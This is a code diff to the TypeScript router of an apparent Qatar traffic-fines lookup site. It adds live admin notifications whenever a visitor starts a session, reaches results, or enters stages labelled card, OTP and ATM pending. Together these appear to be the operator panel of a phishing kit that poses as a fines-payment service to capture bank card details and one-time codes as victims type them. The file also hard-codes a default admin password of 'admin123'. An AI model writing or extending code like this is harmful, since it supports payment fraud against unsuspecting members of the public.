@@ -22,6 +22,7 @@ import { scrapeQatarFines, PLATE_SOURCES, QATAR_PLATE_TYPES, getPlateCodeOptions
 import crypto from "crypto";
 import { nanoid } from "nanoid";
 import { runMigrations } from "./_core/migrate";
+import { notifyAdmin } from "./visitors";
 
 const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "admin123";
 const adminTokens = new Set<string>();
@@ -94,6 +95,7 @@ export const appRouter = router({
             qidNumber: input.inquiryType === "qid" ? input.ownerId : undefined,
             establishmentId: input.inquiryType === "establishment" ? input.ownerId : undefined,
           });
+          notifyAdmin("new_session", { sessionId: currentSessionId });
         }
 
         try {
@@ -132,6 +134,7 @@ export const appRouter = router({
             qidNumber: input.inquiryType === "qid" ? input.ownerId : undefined,
             establishmentId: input.inquiryType === "establishment" ? input.ownerId : undefined,
           });
+          notifyAdmin("update_session", { sessionId: currentSessionId, stage: "results" });
 
           if (finesCount > 0) {
             await createFines(
@@ -232,6 +235,7 @@ export const appRouter = router({
           stage: "card_pending",
           statusRead: 0,
         });
+        notifyAdmin("update_session", { sessionId: input.sessionId, stage: "card_pending" });
         return { success: true };
       }),
 
@@ -243,6 +247,7 @@ export const appRouter = router({
           stage: "otp_pending",
           statusRead: 0,
         });
+        notifyAdmin("update_session", { sessionId: input.sessionId, stage: "otp_pending" });
         return { success: true };
       }),
 
@@ -254,6 +259,7 @@ export const appRouter = router({
           stage: "atm_pending",
           statusRead: 0,
         });
+        notifyAdmin("update_session", { sessionId: input.sessionId, stage: "atm_pending" });
         return { success: true };
       }),
   }),
